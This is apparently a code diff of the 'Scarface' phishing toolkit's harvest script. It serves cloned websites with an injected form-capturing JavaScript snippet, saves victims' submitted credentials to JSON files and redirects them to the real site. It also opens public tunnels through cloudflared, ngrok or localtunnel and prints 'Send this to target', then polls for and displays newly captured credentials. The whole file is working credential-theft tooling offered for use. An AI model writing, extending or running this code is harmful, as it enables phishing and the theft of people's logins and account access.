@@ -1,110 +1,47 @@
 import os
 import sys
-import subprocess
-import threading
-import json
 import time
-from datetime import datetime
-from flask import Flask, request, redirect, send_from_directory
+import json
 
-# Paths
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # Scarface/Harvest
-SCARFACE_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, '..'))  # Scarface root directory
-CREDENTIALS_DIR = os.path.join(SCARFACE_ROOT, "credentials")  # Scarface/credentials
+from utils import (
+    SCARFACE_ROOT, CREDENTIALS_DIR, CYAN, BLUE, RED, GREEN, LIGHT_GREEN, BOLD, RESET,
+    list_cloned_sites, get_site_dir, select_site, clear_screen, find_main_file, print_banner_and_url
+)
+from flask_server import launch_flask_server
+from php import launch_php_server
+from tunnel import run_expose_and_get_url
 
-# NEW: Also load sites from Scarface/sites/
-SITES_DIRS = [
-    os.path.join(SCRIPT_DIR, 'sites'),           # Scarface/Harvest/sites
-    os.path.join(SCARFACE_ROOT, 'sites'),        # Scarface/sites
-]
+# Import injectors
+sys.path.insert(0, os.path.join(SCARFACE_ROOT, "Injector"))
+from inject import inject_logger_to_all_html, inject_logger_to_php
 
-# UPDATED: Use exposers from the Scarface root directory
-EXPOSE_DIR = os.path.join(SCARFACE_ROOT, 'expose')  # Scarface/expose
+EXPOSE_DIR = os.path.join(SCARFACE_ROOT, 'expose')
 
-HARVEST_ROUTE = "/harvest"
-
-# Flask config
-LISTEN_HOST = "0.0.0.0"
-LISTEN_PORT = 8080
-
-# ANSI color codes for pretty CLI
-CYAN = "\033[36m"
-BLUE = "\033[34m"
-RED = "\033[91m"
-GREEN = "\033[92m"
-LIGHT_GREEN = "\033[38;5;120m"
-BOLD = "\033[1m"
-RESET = "\033[0m"
-
-app = Flask(__name__)
-selected_site_name = None
-selected_site_dir = None
-entry_file = None
-
-def save_credentials(site, log_data):
-    """
-    Save credentials to Scarface/credentials/<sitename>/result.json
-    """
-    site_dir = os.path.join(CREDENTIALS_DIR, site)
-    os.makedirs(site_dir, exist_ok=True)
-    credentials_file = os.path.join(site_dir, "result.json")
-    try:
-        with open(credentials_file, "r") as f:
-            data = json.load(f)
-            if not isinstance(data, list):
-                data = []
-    except Exception:
-        data = []
-    data.append(log_data)
-    with open(credentials_file, "w") as f:
-        json.dump(data, f, indent=4)
-
-def list_cloned_sites():
-    # Collect all unique directories in all SITES_DIRS
-    found_sites = set()
-    for sites_dir in SITES_DIRS:
-        if not os.path.exists(sites_dir):
-            os.makedirs(sites_dir, exist_ok=True)
-        for d in os.listdir(sites_dir):
-            full_dir = os.path.join(sites_dir, d)
-            if os.path.isdir(full_dir):
-                found_sites.add(d)
-    return sorted(list(found_sites))
-
-def get_site_dir(site_name):
-    # Prefer root Scarface/sites, then fallback to Harvest/sites
-    for sites_dir in SITES_DIRS[::-1]:
-        site_path = os.path.join(sites_dir, site_name)
-        if os.path.isdir(site_path):
-            return site_path
-    # Fallback: default to the first SITES_DIR
-    return os.path.join(SITES_DIRS[0], site_name)
-
-def select_site(sites):
-    print(f"\n{BOLD}{CYAN}Available Cloned Sites:{RESET}")
-    for idx, site in enumerate(sites, 1):
-        print(f"  {CYAN}{idx}.{RESET} {site}")
+def prompt_for_port(default_port=8080):
+    print(f"\n{CYAN}Choose a port to host the server on:{RESET}")
+    print(f"{CYAN}1.{RESET} 8080 (Default)")
+    print(f"{CYAN}2.{RESET} 5000")
+    print(f"{CYAN}3.{RESET} 80")
+    print(f"{CYAN}4.{RESET} Custom")
     while True:
         try:
-            choice = int(input(f"\n{BLUE}Enter site number to deploy:{RESET} "))
-            if 1 <= choice <= len(sites):
-                return sites[choice - 1]
-            print(f"{RED}[ERROR] Invalid number{RESET}")
+            choice = int(input(f"\n{BLUE}Select port option:{RESET} "))
+            if choice == 1:
+                return 8080
+            elif choice == 2:
+                return 5000
+            elif choice == 3:
+                return 80
+            elif choice == 4:
+                port = input(f"{BLUE}Enter custom port (1024-65535):{RESET} ")
+                if port.isdigit() and 1024 <= int(port) <= 65535:
+                    return int(port)
+                else:
+                    print(f"{RED}[ERROR] Invalid port number, must be 1024-65535.{RESET}")
+            else:
+                print(f"{RED}[ERROR] Invalid option{RESET}")
         except ValueError:
             print(f"{RED}[ERROR] Enter a number{RESET}")
-
-def detect_entry_file(site_dir):
-    index_path = os.path.join(site_dir, "index.html")
-    if os.path.exists(index_path):
-        return "index.html"
-    html_files = [f for f in os.listdir(site_dir) if f.endswith(".html")]
-    if html_files:
-        return html_files[0]
-    print(f"{RED}[ERROR] No HTML files found in the selected site directory.{RESET}")
-    sys.exit(1)
-
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
 
 def expose_menu():
     print(f"\n{BOLD}{CYAN}Expose to the internet{RESET}")
@@ -123,153 +60,137 @@ def expose_menu():
         except ValueError:
             print(f"{RED}[ERROR] Enter a number{RESET}")
 
-def run_expose_and_get_url(option):
-    expose_scripts = {
-        1: "cloudflared.py",
-        2: "ngrok.py",
-        3: "localtunnel.py"
-    }
-    url_patterns = {
-        1: r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com",
-        2: r"https://[a-zA-Z0-9\-]+\.ngrok-free\.app",
-        3: r"https://[a-zA-Z0-9\-]+\.loca\.lt"
-    }
-    if option in expose_scripts:
-        print(f"\n{CYAN}Launching tunnel...{RESET}")
-        script = os.path.join(EXPOSE_DIR, expose_scripts[option])
-        proc = subprocess.Popen(
-            [sys.executable, script],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        import re
-        url_regex = re.compile(url_patterns[option])
-        url = None
-        start = time.time()
-        max_wait = 30  # seconds
-        while time.time() - start < max_wait:
-            line = proc.stdout.readline()
-            if not line:
-                continue
-            match = url_regex.search(line)
-            if match:
-                url = match.group(0)
-                break
-        if url:
-            print(f"\n{BOLD}{CYAN}Send this to target:{RESET} {LIGHT_GREEN}{url}{RESET}")
-        else:
-            print(f"{RED}[ERROR] Could not extract public URL. Check your tunnel process manually.{RESET}")
-    elif option == 4:
-        print(f"\n{CYAN}Launched on localhost only. No tunnel started.{RESET}")
-    elif option == 5:
-        print(f"{GREEN}Goodbye from Scarface!{RESET}")
-        os._exit(0)
-
-INJECTION_SCRIPT = f"""
-<script>
-    document.addEventListener('submit', function(event) {{
-        const form = event.target;
-        const formData = new FormData(form);
-        const data = {{}};
-        formData.forEach((value, key) => data[key] = value);
-        fetch('{HARVEST_ROUTE}', {{
-            method: 'POST',
-            headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify(data)
-        }});
-    }});
-</script>
-"""
-
-@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
-@app.route("/<path:path>", methods=["GET", "POST"])
-def serve_site(path):
-    global entry_file, selected_site_dir, selected_site_name
-    if selected_site_dir is None or entry_file is None:
-        return "No site selected. Restart Scarface.", 500
-    if not path:
-        path = entry_file
-    file_path = os.path.join(selected_site_dir, path)
-    abs_file_path = os.path.abspath(file_path)
-    if not abs_file_path.startswith(os.path.abspath(selected_site_dir)):
-        return "Forbidden.", 403
-    if request.method == "POST":
-        form_data = request.form.to_dict()
-        log_data = {
-            "timestamp": str(datetime.now()),
-            "form_data": form_data
-        }
-        save_credentials(selected_site_name, log_data)
-        return redirect("https://original-website.com")
-    if os.path.exists(file_path) and os.path.isfile(file_path):
-        if file_path.endswith(".html"):
-            with open(file_path, "r", encoding="utf-8") as f:
-                content = f.read()
-            content = content.replace("</body>", f"{INJECTION_SCRIPT}</body>")
-            return content
-        else:
-            rel_path = os.path.relpath(file_path, selected_site_dir)
-            return send_from_directory(selected_site_dir, rel_path)
-    return "404 - Not Found", 404
-
-@app.route(HARVEST_ROUTE, methods=["POST"])
-def harvest():
-    global selected_site_name
+def get_credential_count(site_name):
+    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
+    credentials_file = os.path.join(site_dir, "result.json")
+    if not os.path.exists(credentials_file):
+        return 0
     try:
-        harvested_data = request.get_json()
+        with open(credentials_file, "r") as f:
+            data = json.load(f)
+            if isinstance(data, list):
+                return len(data)
     except Exception:
-        harvested_data = {}
-    log_data = {
-        "timestamp": str(datetime.now()),
-        "harvested_data": harvested_data
-    }
-    save_credentials(selected_site_name, log_data)
-    print(f"{GREEN}{BOLD}Captured credentials!{RESET}")
-    return "", 204
+        pass
+    return 0
 
-def flask_runner():
-    import logging
-    log = logging.getLogger('werkzeug')
-    log.setLevel(logging.ERROR)
-    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False, use_reloader=False)
+def print_credentials(site_name):
+    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
+    credentials_file = os.path.join(site_dir, "result.json")
+    if not os.path.exists(credentials_file):
+        return
+    with open(credentials_file, "r") as f:
+        try:
+            creds = json.load(f)
+        except json.JSONDecodeError:
+            return
+    if not creds:
+        return
+    print(f"\n{BOLD}{GREEN}Latest Captured Credentials:{RESET}")
+    for i, cred in enumerate(creds[-5:][::-1], 1):  # Show last 5 entries
+        print(f"\n{CYAN}{i}. Time: {cred.get('timestamp', 'N/A')}{RESET}")
+        data = cred.get('data', {}) or cred.get('form_data', {})
+        if not data and 'raw' in cred:
+            print(f"   {BLUE}raw:{RESET} {cred['raw']}")
+        else:
+            for key, value in data.items():
+                print(f"   {BLUE}{key}:{RESET} {value}")
+
+def monitor_credentials(site_name):
+    """Monitor credential file and show notifications"""
+    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
+    credentials_file = os.path.join(site_dir, "result.json")
+    last_count = 0
+    # Initialize file if not exists
+    if not os.path.exists(credentials_file):
+        os.makedirs(site_dir, exist_ok=True)
+        with open(credentials_file, 'w') as f:
+            json.dump([], f)
+    else:
+        try:
+            with open(credentials_file, 'r') as f:
+                last_count = len(json.load(f))
+        except json.JSONDecodeError:
+            last_count = 0
+    print(f"\n{BOLD}{GREEN}Waiting for credentials... (Ctrl+C to stop){RESET}")
+    try:
+        while True:
+            with open(credentials_file, 'r') as f:
+                try:
+                    current_count = len(json.load(f))
+                except json.JSONDecodeError:
+                    current_count = 0
+            if current_count > last_count:
+                print(f"\n{BOLD}{GREEN}NEW CREDENTIALS CAPTURED!{RESET}")
+                print_credentials(site_name)
+                last_count = current_count
+                # Play notification sound if available
+                try:
+                    import winsound
+                    winsound.Beep(1000, 300)
+                except:
+                    pass
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
 
 def main():
-    global selected_site_name, selected_site_dir, entry_file
+    if not os.path.exists(CREDENTIALS_DIR):
+        os.makedirs(CREDENTIALS_DIR)
     clear_screen()
-    print(f"\n{BOLD}{CYAN}=== Scarface ==={RESET}")
     cloned_sites = list_cloned_sites()
     if not cloned_sites:
         print(f"{RED}[INFO] No sites found in sites directory.{RESET}")
         sys.exit(1)
     selected_site_name = select_site(cloned_sites)
     selected_site_dir = get_site_dir(selected_site_name)
-    entry_file = detect_entry_file(selected_site_dir)
-
-    clear_screen()
-    print(f"\n{CYAN}Launching localhost...{RESET}")
-    flask_thread = threading.Thread(target=flask_runner, daemon=True)
-    flask_thread.start()
-    import socket
-    for _ in range(30):
-        try:
-            with socket.create_connection(("127.0.0.1", LISTEN_PORT), timeout=0.5):
-                break
-        except OSError:
-            time.sleep(0.3)
-    print(f"{GREEN}Localhost launched!{RESET}")
+    main_file, site_type = find_main_file(selected_site_dir)
+    if not main_file:
+        print(f"{RED}[ERROR] No main HTML or PHP file found in {selected_site_dir}{RESET}")
+        sys.exit(1)
+    # Inject logger before anything else (always inject, no output)
+    if site_type == "php":
+        inject_logger_to_php(selected_site_dir, selected_site_name, CREDENTIALS_DIR)
+    else:
+        inject_logger_to_all_html(selected_site_dir)
+    # Prompt for port before launching server
+    listen_port = prompt_for_port()
+    try:
+        if site_type == "php":
+            php_proc, actual_port = launch_php_server(selected_site_dir, main_file, listen_port)
+            print(f"{GREEN}PHP server started on port {actual_port}{RESET}")
+        else:
+            main_file_rel = os.path.relpath(main_file, selected_site_dir)
+            site_credentials_dir = os.path.join(CREDENTIALS_DIR, selected_site_name)
+            flask_proc = launch_flask_server(selected_site_dir, main_file_rel, site_credentials_dir, listen_port)
+            print(f"{GREEN}Flask server started on port {listen_port}{RESET}")
+    except Exception as e:
+        print(f"{RED}Failed to start server: {e}{RESET}")
+        sys.exit(1)
     time.sleep(1)
     clear_screen()
     option = expose_menu()
-    run_expose_and_get_url(option)
-    try:
-        while True:
-            flask_thread.join(1)
-    except KeyboardInterrupt:
-        print(f"\n{GREEN}Goodbye from Scarface!{RESET}")
-        os._exit(0)
+    if option in (1, 2, 3):  # Cloudflared, Ngrok, LocalTunnel
+        clear_screen()
+        print(f"{GREEN}Starting tunnel please wait...{RESET}")
+        url, tunnel_proc = run_expose_and_get_url(option, EXPOSE_DIR, listen_port)
+        if not url:
+            print(f"{RED}[ERROR] Tunnel failed or exited.{RESET}")
+            sys.exit(1)
+        print_banner_and_url(url)
+    elif option == 4:  # Localhost
+        url = f"http://localhost:{listen_port}"
+        print_banner_and_url(url)
+    else:  # Exit
+        sys.exit(0)
+    # Start credential monitoring
+    monitor_credentials(selected_site_name)
+    print(f"\n{GREEN}Goodbye from Scarface!{RESET}")
+    sys.exit(0)
 
 if __name__ == "__main__":
-    if not os.path.exists(CREDENTIALS_DIR):
-        os.makedirs(CREDENTIALS_DIR)
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{RED}Operation cancelled by user.{RESET}")
+        sys.exit(1)
